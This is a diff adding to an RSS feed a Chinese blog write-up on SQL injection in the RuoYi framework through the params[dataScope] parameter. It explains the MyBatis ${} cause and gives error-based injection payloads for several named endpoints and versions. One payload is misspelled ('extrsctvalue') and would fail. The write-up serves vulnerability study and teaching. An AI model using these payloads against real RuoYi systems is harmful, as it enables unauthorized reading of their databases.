@@ -1137,6 +1137,43 @@
 &lt;/tbody&gt;
 &lt;/table&gt;
 &lt;p&gt;RuoYi-4.6.2版本开始就使用随机密钥的方式，而不使用固定密钥，若要使用固定密钥需要开发者自己指定密钥，因此4.6.2版本之后，在没有获取到密钥的情况下无法再进行利用&lt;/p&gt;
+&lt;h2 id=&#34;sql注入-systemrolelist&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql注入-systemrolelist&#34;&gt;#&lt;/a&gt; SQL注入-/system/role/list&lt;/h2&gt;
+&lt;p&gt;该漏洞的问题出现在&lt;code&gt;params[dataScope]&lt;/code&gt;，RuoYi的实体类一般继承自&lt;code&gt;BaseEntity&lt;/code&gt;：&lt;/p&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;public class BaseEntity&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;    private Map&amp;#x3C;String, Object&gt; params;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Spring MVC可以把请求参数&lt;code&gt;params[dataScope]&lt;/code&gt;绑定到&lt;code&gt;role.getParams().get(&amp;quot;dataScope&amp;quot;)&lt;/code&gt;，而在MyBatis XML中，部分版本会写成&lt;code&gt;$&amp;#123;params.dataScope&amp;#125;&lt;/code&gt;而没有使用&lt;code&gt;#&amp;#123;paramls.dataScope&amp;#125;&lt;/code&gt;，这就导致如果dataScope能被用户控制的话，直接拼接进入实现SQL注入&lt;/p&gt;
+&lt;p&gt;正常情况下dataScope适用于数据权限控制，RuoYi通常通过&lt;code&gt;@DataScope(deptAlias = &amp;quot;d&amp;quot;)&lt;/code&gt;注解，在AOP切面构造SQL条件，例如：&lt;/p&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;@DataScope(deptAlias = &#34;d&#34;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;public List&amp;#x3C;SysRole&gt; selectRoleList(SysRole role)&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;    return roleMapper.selectRoleList(role);&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;切面会根据当前登录用户生成类似&lt;code&gt;AND d.dept_id IN (...)&lt;/code&gt;，然后放入&lt;code&gt;params.put(&amp;quot;dataScope&amp;quot;,sqlString)&lt;/code&gt;，理论上这个值应当完全由服务端产生，如果某些逻辑条件没有进入数据权限拼接流程，客户端原来传入的&lt;code&gt;params[dataScope]&lt;/code&gt;就可能保留&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;$&amp;#123;params.dataScope&amp;#125;&lt;/code&gt;这段代码时MyBatis的动态SQL之一，主要用于在SQL查询中嵌入外部定义的字符串或参数，&lt;code&gt;$&amp;#123;&amp;#125;&lt;/code&gt;表示取出params对象中名为&lt;code&gt;dataScope&lt;/code&gt;的属性值，并将其直接嵌入到SQL查询中&lt;/p&gt;
+&lt;p&gt;在一个基于角色权限管理的系统中，不同的用户可能有权限查看不同的数据记录，管理员可能可以查看所有部门的记录，而普通用户只能查看自己部门的记录，在这种情况下，dataScope的值可以是一个根据用户角色动态生成的SQL片段，如&lt;code&gt;AND dept_id IN (SELECT dept_id FROM user_dept_access WHERE user_id = #&amp;#123;userID&amp;#125;)&lt;/code&gt;用以限定查询结果只包含特定部门的用户信息&lt;/p&gt;
+&lt;p&gt;payload：&lt;/p&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#x26;params[dataScope]=and extractvalue(1,concat(0x7e,(select user()),0x7e))&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;其他注入点（&amp;lt; V-4.6.2）：&lt;/p&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;# /role/export&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;# /user/list&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;# /dept/list&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;# /role/authUser/allocatedList&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;# /role/authUser/unallocatedList&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;# /dept/edit&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;DeptName=xxxxxxxxxxx&amp;#x26;DeptId=100&amp;#x26;ParentId=555&amp;#x26;Status=0&amp;#x26;OrderNum=1&amp;#x26;ancestors=0)or(extractvalue(1,concat(0,(select user()))));#&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;# /tool/gen/createTable(V-4.7.1-V-4.7.5)&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;POST&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;sql=CREATE table ss1 as SELECT/**/* FROM sys_job WHERE 1=1 union/**/SELECT/**/extrsctvalue(1,concat(0x7e,(select/**/version()),0x7e));&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
  ]]></description>
         </item>
         <item>
